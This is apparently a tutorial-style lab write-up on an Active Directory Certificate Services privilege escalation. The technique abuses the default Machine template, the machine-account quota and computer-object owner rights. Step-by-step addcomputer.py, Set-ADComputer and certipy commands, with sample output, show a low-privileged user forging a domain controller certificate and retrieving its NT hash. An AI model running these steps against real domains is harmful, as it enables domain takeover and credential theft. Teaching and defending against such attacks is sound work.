It's a vulnerability in AD Certificate Services.
<br>

Summary:
----
Active Directory Certificate Services (AD CS) is an essential component of Microsoft’s Public Key Infrastructure (PKI) that provides various services to support identity and access management within organizations. While it is primarily recognized for its role in issuing and managing digital certificates for secure communication (like HTTPS), its capabilities extend well beyond this.

**Client Authentication**
It's allows the owner of the certificate to use it to verify their own identity in AD for authentication purposes. For example, a client certificate is used to authenticate against a web application. The authentication process occurs through Kerberos. If we have a valid certificate that has the Client Authentication EKU, we can interface with AD CS and the Key Distribution Centre to request a Kerberos TGT that can then be used for further authentication. <br>

As an attacker, we can leverage this to generate a TGT to impersonate another user or system, should we have a valid certificate for them. In essence, we want to be able to modify the Subject Alternative Name (SAN) attribute of the certificate request to point to someone or something else, that has more permissions to perform privilege escalation.

**Default Certificate Templates**

By default, when AD CS is installed in an environment, two certificate templates are made available for requests that support Client Authentication:

    User Certificate Template - This certificate template can be requested by any user that belongs to the Domain Users group.
    Machine Certificate Template - This certificate template can be requested by any host that belongs to the Domain Computers group.


The User Template is not vulnerable by default. When we request a certificate based on the User template, the User Principal Name (UPNs) of the user account will be embedded in the SAN that can be used for identification. Since UPNs must be unique, and we usually do not have the ability to modify our UPN, we cannot leverage this template. Furthermore, since we don't have the ability to alter the SAN value in the certificate signing request, we cannot impersonate another user by specifying their UPN.
<br>

However, computer accounts do not have a UPN. Instead of using a UPN for authentication, the Machine template uses the DNS Name of the machine for identification and authentication. When a certificate is requested for a machine through the Machine template, AD CS embeds the machine's DNS Name into the SAN, which is then used for authentication.

**Default Domain User Privileges**

By default, any user who is a member of the Authenticated Users group (literally all AD accounts) can enrol up to 10 new machines on the domain. 


When we enrol a new host in AD, we are assigned as the owner of that host. This provides us with certain permissions over the AD Object associated with that host. Two permissions in particular cause an issue here:

    Validate write to DNS hostname - This permission allows us to update the DNS hostname of our AD Object associated with the host.
    Validate write to Service Principal Name (SPN) - This permission allows us to update the SPN of our AD Object associated with the host.

>SPNs must be unique, meaning two AD Objects are not allowed to have the same SPN.

Our goal here is changing the DNS hosname of our joined machine to the DNS of the domain controller.
-

**Putting it all Together**

Using these configurations, **the default AD CS Machine certificate template**, **the default ability to enrol a new machine**, and **the default permissions assigned on the created Computer AD Object**, we have a privilege escalation vector on our hands. What makes it worse is that this privilege escalation vector requires minimal effort, meaning the attacker's skill level to exploit this issue is quite low. The basic steps are the following:

    1- Compromise the credentials of a low-privileged AD user.
    2- Use those credentials to enrol a new host on the domain.
    3- Alter the DNS hostname attribute of the Computer AD Object to that of a privileged host, such as a Domain Controller.
    4- Remove the SPN attributed to bypass the unique SPN conflict issue.
    5- Request a Machine certificate using the default template.
    6- Perform Kerberos authentication with the received template, now as the privileged machine account instead of our fake machine account.


Now that we have covered the theory. Let's see it in action. 

**Adding a Computer to the Domain**


using our low user, we can add a computer to the domain to generate a Machine certificate using mpacket's ```addcomputer.py```:
```
addcomputer.py '<domain name>/<our username>:<his password>' -method LDAPS -computer-name 'TESTDC' -computer-pass 'Password123'
```
First, let's generate a certificate for the new computer we created using ```certipy```:
```
certipy req -u "TESTDC$@<domain name>" -p '<its password>' -ca <Cert Authority server of the domain> -template Machine
```

We could dump the CA of the domain:
```
certipy find -u "<username>@<domain name>" -p '<his password>' -target <domain name>
```
we can verify that the certificate is valid by using Certipy:
```
certipy-ad auth -pfx TESTDC$
Certipy v3.0.0 - by Oliver Lyak (ly4k)

[*] Using principal: TESTDC$@test.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'TESTDC.ccache'
[*] Trying to retrieve NT hash for 'TESTDC$'
[*] Got NT hash for 'TESTDC$@test.local': <the ntml hash>

```
This command will dump the ntml hash of this computer.

**Updating the DNS Hostname and SPN Attributes**


we should open a session using our low user using ```evil-winrm```. <br>

Let's first just get the current attributes from our Computer AD Object using the Get-ADComputer cmdlet:
```
PS C:\> Get-ADComputer TESTDC -properties dnshostname,serviceprincipalname
```

Let's try to update the DNS hostname attribute to that of the DC using the ```Set-ADComputer``` cmdlet:
```
PS C:\> Set-ADComputer TESTDC -DnsHostName LUNDC.lunar.eruca.com
Set-ADComputer : The operation failed because SPN value provided for addition/modification is not unique forest-wide 
At line:1 char:1                                                                                                     
+ Set-ADComputer TESTDC -DnsHostName TESTDC.test.local                                                           
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                                           
    + CategoryInfo          : NotSpecified: (TESTDC:ADComputer) [Set-ADComputer], ADException                        
    + FullyQualifiedErrorId : ActiveDirectoryServer:8647,Microsoft.ActiveDirectory.Management.Commands.SetADComputer
```
As we can see from the output, Microsoft automatically changes the SPN attribute when we set the DNS hostname. Since an SPN already exists for LUNDC, the command fails.
```
يعني بمعني اصح لازم قبل ما نغير ال
DNC
بتاع الجهاز بتاعنا لازم نشيل ال
SPN
علشان ميحصلش مشكله
```
To counter this, let's first remove our current SPN attribute:
```
Set-ADComputer TESTDC -ServicePrincipalName @{}
```
Now that we have flushed our Computer AD Object's SPN, let's again try to set the DNS hostname attribute to that of the DC:
```
PS C:\>Set-ADComputer TESTDC -DnsHostName DomainController.test.local
```
Now, we change the DNS of our joind machine to the DNS of the domain controller, So we could request a certificate using the forged DNS (domain controller DNS) of our machine

**Forging a Malicious Certificate**

Time to regenerate some certificates! Let's run that same command of Certipy again to request a new certificate for our computer:

 ```
certipy req -u "TESTDC$@<domain name>" -p '<its password>' -ca <Cert Authority server of the domain> -template Machine
Certipy v3.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate
[*] Successfully requested certificate
[*] Request ID is 21
[*] Got certificate with DNS Host Name 'DomainController.test.local'
[*] Saved certificate and private key to 'DomainController.pfx'
```
This time we noticed something different. Even though we requested a certificate for TESTDC, we got a certificate for DomainController. Let's verify that this certificate is working and will return the NTLM hash of the DomainController machine account instead:
```
certipy auth -pfx DomainController.pfx
Certipy v3.0.0 - by Oliver Lyak (ly4k)

[*] Using principal: DomainController$@test.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'DomainController.ccache'
[*] Trying to retrieve NT hash for 'DomainController$'
[*] Got NT hash for 'DomainController$@test.local': <the NTML hash>
```
      


      

















